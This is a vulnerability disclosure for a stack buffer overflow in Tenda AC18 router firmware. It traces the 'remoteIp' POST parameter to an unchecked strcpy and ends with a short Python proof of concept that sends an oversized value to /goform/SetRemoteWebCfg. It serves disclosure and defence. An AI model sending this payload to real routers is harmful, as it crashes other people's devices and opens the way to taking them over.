## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetSafeWanWebMan` function. The `v7` variable receives the `remoteIp` parameter from a POST request and is later passed to the `sub_B677C` function. 

![image-20240425210658819](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240425210658819.png)

In `sub_B677C` function, the variable `a1` is passed to function `sub_B44F0`. 

![image-20240425210817918](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240425210817918.png)

In function `sub_B44F0`, the variable `a1` is directly assigned to `(char *)&a4[38 * a3 + 2] + 2` by `strcpy` However, since the Since user can control the input of  `remoteIp`, the statemeant `strcpy((char *)&a4[38 * a3 + 2] + 2, a1);` can cause a buffer overflow. The user-provided  `remoteIp` can exceed the capacity of the `(char *)&a4[38 * a3 + 2] + 2` array, triggering this security vulnerability.

![image-20240425211447623](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240425211447623.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.102"
url = "http://" + ip + "/goform/SetRemoteWebCfg"
payload = b"a"*2000

data = {"remoteIp": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240425210633040](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240425210633040.png)
